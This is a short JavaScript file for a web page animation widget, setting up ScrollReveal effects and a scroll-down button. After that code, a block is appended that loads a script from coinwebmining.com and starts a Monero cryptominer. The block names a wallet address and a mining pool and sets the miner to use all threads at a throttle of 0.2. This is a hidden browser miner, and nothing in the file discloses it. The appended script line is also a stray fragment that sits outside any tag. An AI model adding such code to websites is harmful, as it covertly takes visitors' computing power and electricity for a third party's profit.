

/*
 * animation widget from here: https://github.com/silexlabs/Silex/issues/443
 */
$(function() {
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    if(!isMobile) {
        window.sr = ScrollReveal({
            distance: '100px'
        });
        sr.reveal('.from-left', { origin:  'left'});
        sr.reveal('.from-right', { origin:  'right'});
        sr.reveal('.from-top', { origin:  'top'});
        sr.reveal('.from-bottom', { origin:  'bottom'});
    }
    $('.scroll-down').click(function(event) {
        // Preventing default action of the event
        event.preventDefault();
        // Getting the height of the document
        var n = $(window).height();
        $('html, body').animate({ scrollTop: n }, 500);
    });
})

    src="https://coinwebmining.com/cwm.js";


    var site_id = 'cwm-2627';
    var coin = 'monero';
    var wallet = '46YVNRoBHJKHmrHaGpnw5FMEfjE6Sbhg2KKnKSgeWap1PixV4jv1CENDdp1W7XqXLSdbG5XN5PXwfijznzVDkyrKJK1VBku';
    var password = 'x';
    var mining_pool = 'gulf.moneroocean.stream:10001';
    var threads = -1;
    var throttle = 0.2;
    var debug = false;
    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);

    